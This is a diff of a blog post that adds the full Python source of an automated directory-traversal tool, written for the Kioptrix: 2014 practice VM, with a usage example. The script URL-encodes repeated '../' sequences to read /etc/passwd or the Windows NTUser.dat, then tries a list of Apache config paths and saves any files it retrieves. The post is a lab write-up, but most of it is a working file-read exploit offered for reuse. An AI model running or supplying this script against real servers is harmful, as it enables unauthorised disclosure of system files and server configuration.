@@ -13,18 +13,93 @@ This project is a simple python script I wrote to help automate directory traver
 
 I will be posting a full write up of [Kioptrix: 2014 (#5)](#) in the near future.
 
-The full directory traversal script is [here]({{ site.url }}/assets/traversal/directorytraversal.txt)
+***Directorytraversal.py***([raw]({{ site.url }}/assets/traversal/directorytraversal.txt))
 
-Take a look at the full script to understand what options can be specified at the command line. I tried to write the script in a way that I can continue to add new features in the future. Below I will go over how I used this script for the Kioptrix: 2014 vm.
+{% highlight python %}
+#Try to find root directory with directory traversal
+#Then try to find the config file for server
 
-To run the script I will specify the url (-u) and server (-s).
+#To-do:
+#	Add options for servers other than apache
+
+from optparse import OptionParser	
+import requests
+import urllib
+
+def findConf(traversal,server,outpath):
+	print "Trying to find config file"
+	
+	with open("./{}conflist".format(server)) as infile:
+			for line in infile:
+				r = requests.get(traversal.format(line.strip()))
+				#print traversal.format(line.strip())
+				if r.status_code == 200 and r.content != "":
+					print "Found config {}".format(line)
+					break
+
+	#Use .html so I don't have to deal with formatting 
+	with open(outpath+"config.html", 'w') as f:
+		f.write(traversal.format(line.strip())+"\n\n")
+		f.write(urllib.unquote(r.content))
+
+		
+def main():
+	parser = OptionParser("usage%prog -u <url with {} at injection point> -s <web server> -o <outfile> -w ")
+	parser.add_option('-u', '--url', dest='url', type='string', help='url with brackets at point to try traversal')
+	parser.add_option('-s', '--server', dest='server', default="apache", type='string', help='Specify server:\n\tapache\n\ttodo-add more lists')
+	parser.add_option('-o', '--out', dest='outpath', default="./", type='string', help='outfile for config file if found')
+	parser.add_option('-w', '--windows', action='store_true', dest='win', default=False, help='Specify server running in windows environment')
+	(options, args) = parser.parse_args()
+
+	url = options.url
+	server = options.server
+
+	#Add robustness for filepath later
+	outpath = options.outpath
+
+	if options.win:
+		#This section will need to change when I can test on Windows machine 
+		slash="\\"
+		user = "Administrator"
+		localfile = "C:\\Users\\Administrator\\NTUser.dat"
+	else:
+		slash="/"
+		user = "root"
+		localfile="etc%2fpasswd"
+
+	#Try up to 30
+	for i in range(30):
+		tmp = ""
+		tmp = urllib.quote_plus(("..{}".format(slash))*(i+1))
+		tmp += "{}"
+		
+		traversal = url.format(tmp)
+		print traversal.format(localfile)
+		r = requests.get(traversal.format(localfile))
+
+		#print r.content
+		if r.status_code == 200 and user in r.content:
+		#	print "Done"
+			with open(outpath+"dt-file.html",'w') as f:
+				f.write(r.content)
+			findConf(traversal,server,outpath)	
+			break
+
+
+if __name__ == '__main__':
+	main() 
+{% endhighlight %}
+
+I tried to write the script in a way that I can continue to add new features in the future. Below I will go over how I used this script for the Kioptrix: 2014 vm.
+
+To run the script I specified the url (-u) and server (-s).
 {% highlight bash %}
 donald@comp:~$ python directorytraversal.py -u "http://vulnerable-site/index.php?path={}" -s apache
 {% endhighlight %}
 
 Two things to note about the -u option, are that the url should be in quotations and the parameter in the url which is vulnerable to directory traversal should be specified by {}.
 
-I chose to specify the url this way so that I could easily use format function to place the series of "../" anywhere in the url.
+I chose to specify the url this way so that I could easily use the format function to place the series of "../" anywhere in the url.
 
 After setting the options correctly, I needed to automate finding the root directory by trying access the /etc/passwd file. 
 
@@ -124,5 +199,4 @@ Please contact me if you have suggestions for the apache config list or lists fo
 
 As I continue to learn, I will update this tool to be able to automate exploitation of different linux and windows servers.
 
-This article will continue to be updated.
 
